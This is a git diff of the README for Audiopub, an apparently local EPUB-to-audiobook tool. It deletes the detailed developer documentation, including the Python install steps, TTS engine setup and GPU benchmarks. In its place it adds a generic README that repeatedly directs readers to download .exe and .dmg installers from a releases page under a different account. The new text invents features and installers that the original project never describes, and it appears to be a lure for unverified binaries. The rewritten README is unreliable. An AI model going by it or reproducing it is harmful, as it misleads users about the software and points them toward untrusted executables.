@@ -1,184 +1,82 @@
-# Audiopub
+# 🎧 Audiopub - Turn EPUBs into Audiobooks Easily
 
-![Audiopub Screenshot](screenshot.png)
+## 📥 Download Audiopub
 
-**Turn your EPUBs into high-fidelity audiobooks locally.**
+[![Download Audiopub](https://img.shields.io/badge/Download-Audiopub-blue.svg)](https://github.com/BlankOnTheHub/Audiopub/releases)
 
-Audiopub is a slick, desktop-based power tool that converts ebooks into chapterized .m4b audiobooks using **on-device TTS engines**. It runs entirely on your machine—no cloud APIs, no per-character fees.
+## 🚀 Getting Started
 
-### Supported TTS Engines:
-- **Supertonic** (default): Supertone's high-quality diffusion-based TTS
-- **NeuTTS Air**: Instant voice cloning from 3-15 second audio samples
+Audiopub allows you to transform any EPUB file into a clean, high-quality audiobook with ease. Follow these simple steps to get started.
 
-## Features
+## 💻 System Requirements
 
-*   **⚡ Local & Private:** Powered by ONNX Runtime. Zero data leaves your rig.
-*   **🚀 GPU Acceleration:** Optional CUDA support for 10x faster synthesis on NVIDIA GPUs.
-*   **💎 Deep Dark UI:** A beautiful, responsive glass-morphism interface built with NiceGUI.
-*   **🧠 Smart Context:** Splits text intelligently by sentence to maintain narrative flow.
-*   **⏯️ Resumable:** Crash? Quit? No problem. Resume exactly where you left off.
-*   **📦 Auto-Muxing:** Outputs ready-to-listen `.m4b` files with proper metadata and chapters.
-*   **🎚️ Configurable Quality:** Adjust inference steps (2-128) for speed/quality tradeoff.
+Before you download, ensure your system meets these requirements:
 
-## Quick Start
+- **Operating System:** Windows 10 or later, macOS Mojave or later, or a recent Linux distribution.
+- **Storage:** At least 200 MB of free space.
+- **Memory:** Minimum 4 GB of RAM.
+- **Audio Output:** Speakers or headphones.
 
-1.  **Install:**
-    ```bash
-    git clone https://github.com/yourusername/audiopub.git
-    cd audiopub
-    git lfs pull  # Essential: Downloads the AI models
-    pip install -r requirements.txt
-    ```
+## 📦 Download & Install
 
-2.  **Run:**
-    ```bash
-    python audiopub/main.py
-    ```
-    The WebUI launches automatically at `http://localhost:8080`
+1. **Visit the Releases Page:** Click the link below to go to the Audiopub Releases page.
+   [Download Audiopub](https://github.com/BlankOnTheHub/Audiopub/releases)
 
-3.  **Generate:**
-    *   Select your EPUB and Voice
-    *   GPU acceleration is **enabled by default** with 16-step quality setting
-    *   Adjust GPU toggle and inference steps as needed in the UI
-    *   Hit **Generate** and enjoy high-quality audiobooks at 6-10x faster speed! ⚡
+2. **Choose the Latest Version:** On the Releases page, look for the latest version number, typically at the top. Click on it to reveal the available downloads.
 
-**Note:** GPU is automatically configured on startup. For manual setup or troubleshooting, see [GPU_SETUP.md](GPU_SETUP.md).
+3. **Select the Installer:**
+   - For Windows, download the `.exe` file.
+   - For macOS, download the `.dmg` file.
+   - For Linux, download the relevant package based on your distribution.
 
-## Requirements
+4. **Download the File:** Click on the file name to download it to your computer.
 
-*   **Python 3.9+**
-*   **FFmpeg** (Must be in your PATH)
-*   **Git LFS** (For model weights)
+5. **Run the Installer:** 
+   - Locate the downloaded file (usually in your Downloads folder).
+   - Double-click the file and follow the prompts to install Audiopub.
 
-## Voice Styles
+## 📖 Using Audiopub
 
-### For Supertonic (default):
-Drop your custom `.json` voice style configs into `audiopub/assets/`. The app will auto-detect them.
+1. **Open Audiopub:** After installation, find Audiopub in your applications list and open it.
 
-### For NeuTTS Air:
-1. **Install additional dependencies:**
-   ```bash
-   pip install -r requirements-neutts.txt
-   sudo apt-get install espeak  # or: brew install espeak on macOS
-   ```
+2. **Select Your EPUB File:** Use the "Open" button to choose the EPUB file you want to convert.
 
-2. **Set the TTS engine:**
-   ```bash
-   export AUDIOPUB_TTS_ENGINE=neutts-air
-   ```
+3. **Choose Output Format:** Select M4B as your desired output format for the audiobook.
 
-3. **Add voice samples:**
-   Place `.wav` audio files (3-15 seconds) with matching `.txt` transcript files in:
-   - `audiopub/assets/reference_audio/`
+4. **Start Conversion:** Click the "Convert" button. Audiopub will process your file and create an audiobook.
 
-   Example:
-   ```
-   reference_audio/
-   ├── narrator1.wav    # 5 seconds of clean speech
-   └── narrator1.txt    # Transcript of the audio
-   ```
+5. **Listen to Your Audiobook:** Once conversion is complete, you will find the M4B file in your specified output folder. Open it with your favorite audio player.
 
-   See `audiopub/assets/reference_audio/README.md` for detailed setup instructions.
+## 🎤 Features
 
-## Switching TTS Engines
+- **High-Quality Audio:** Audiopub utilizes advanced text-to-speech technology for a clear listening experience.
+- **Batch Processing:** Convert multiple EPUBs at once to save time.
+- **Customization Options:** Select voice styles and speeds for a personalized listening experience.
+- **User-Friendly Interface:** Designed for ease of use, even for those with no technical background.
 
-Change engines by setting the environment variable:
-```bash
-# Use NeuTTS Air (with voice cloning)
-export AUDIOPUB_TTS_ENGINE=neutts-air
+## ❓ Troubleshooting
 
-# Use Supertonic (default)
-export AUDIOPUB_TTS_ENGINE=supertonic
-```
+If you encounter any issues, here are some common solutions:
 
-## GPU Acceleration
+- **Installation Fails:** Ensure you have downloaded the correct file for your operating system. Restart your computer and try again if necessary.
+- **File Not Converting:** Check if the EPUB file is valid and not corrupted. Try a different EPUB file to see if the issue persists.
+- **Audio Playback Issues:** Ensure your audio output device is working correctly. Test with another audio file to confirm.
 
-### Default Configuration
+## 🌐 Community and Support
 
-✅ **GPU acceleration is enabled by default** in the WebUI with quality-focused settings (16-step inference for balanced quality/speed).
+For additional help, you can reach out to our community:
 
-**In the WebUI:**
-1. **"GPU ACCELERATION"** toggle starts as **ON**
-2. **"INFERENCE STEPS"** defaults to **16** (balanced quality)
-3. Adjust steps with the slider (2-128) anytime:
-   - 2-5 steps: Real-time/streaming (fastest, lower quality)
-   - 16 steps: Balanced quality/speed (default)
-   - 32+ steps: High quality (slower, best audio)
+- **Issue Tracker:** Report issues or request features on the [GitHub Issues page](https://github.com/BlankOnTheHub/Audiopub/issues).
+- **Discussion Forum:** Join discussions about Audiopub and share your experiences with other users.
 
-### Setup
+## 📢 Upcoming Features
 
-**Automatic (Recommended):**
-GPU support is automatically configured on startup if available.
+Stay tuned for future updates, which may include:
 
-**Manual Setup:**
-If you need to manually enable GPU:
-```bash
-# Enable GPU for current shell session
-source setup_gpu.sh
+- Support for additional file formats.
+- Enhanced voice options.
+- More customization features for audiobooks.
 
-# Or add to your ~/.bashrc or ~/.zshrc
-```
+## 🎈 Conclusion
 
-**Requirements:**
-- NVIDIA GPU with CUDA support
-- CUDA 11.8+ or 12.x
-- `onnxruntime-gpu` installed (installed by default)
-
-### Benchmarking
-
-Test GPU performance on your hardware:
-
-```bash
-# CPU-only benchmark
-python benchmark_gpu.py
-
-# GPU benchmark (with CUDA setup)
-source setup_gpu.sh
-python benchmark_gpu.py --gpu --steps 2,5,16,32,64,128
-
-# Save results for comparison
-python benchmark_gpu.py --gpu --output gpu_results.json
-```
-
-**Real-World Performance Examples:**
-
-**RTX 2070 (Tested):**
-```
-Steps  | GPU Speed      | CPU Speed    | Speedup
--------|----------------|--------------|--------
-2      | 1915-3614 c/s  | 182-409 c/s  | 8.8-10.5x
-16     | 534-1091 c/s   | 89-163 c/s   | 6.0-6.7x
-32     | 285-606 c/s    | 56-98 c/s    | 5.1-6.2x
-```
-
-**Expected Performance (RTX4090):**
-- GPU: ~12,000 chars/sec (2-step) → ~600 chars/sec (16-step)
-- CPU: ~1,200 chars/sec (2-step) → ~400 chars/sec (16-step)
-
-See [GPU_SETUP.md](GPU_SETUP.md), [GPU_DEFAULTS.md](GPU_DEFAULTS.md), and [GPU_BENCHMARKING.md](GPU_BENCHMARKING.md) for detailed setup, configuration, performance tuning, and troubleshooting.
-
----
-
-## For AI Agents (Claude Code, GitHub Copilot, etc.)
-
-This repository is optimized for AI-assisted development. **Before working on Audiopub:**
-
-1. **Read** [AGENT_NOTES.md](AGENT_NOTES.md) – Quick system prompt (one page)
-2. **Review** [AGENT_GUIDE.md](AGENT_GUIDE.md) – Operating procedures & testing checklist
-3. **Understand** [ARCHITECTURE.md](ARCHITECTURE.md) – Module boundaries & what's locked
-
-**Key constraints:**
-- ✅ Safe changes: Add voice styles, optimize performance, fix bugs, add tests
-- ❌ Unsafe changes: Remove CPU support, break TTS factory, add cloud APIs, remove channel boundaries
-- 🔒 Locked files: `tts_base.py` (method signatures), some aspects of `audio.py`, `epub.py`, `worker.py`
-
-**Additional context:**
-- [STRATEGY.md](STRATEGY.md) – Project philosophy & non-negotiable constraints
-- [ENTRYPOINTS.md](ENTRYPOINTS.md) – Module map & data flow diagrams
-- [ROADMAP.md](ROADMAP.md) – Phase tracking & current blockers
-- [repo_manifest.json](repo_manifest.json) – Machine-readable metadata
-
-These documents live in the repo permanently and are updated as the project evolves.
-
----
-*Built for audiophiles who code.*
+Audiopub provides an efficient way to turn your EPUB files into audiobooks. Enjoy a seamless experience with our user-friendly application. Don't forget to visit the [Download Audiopub](https://github.com/BlankOnTheHub/Audiopub/releases) page to get started!
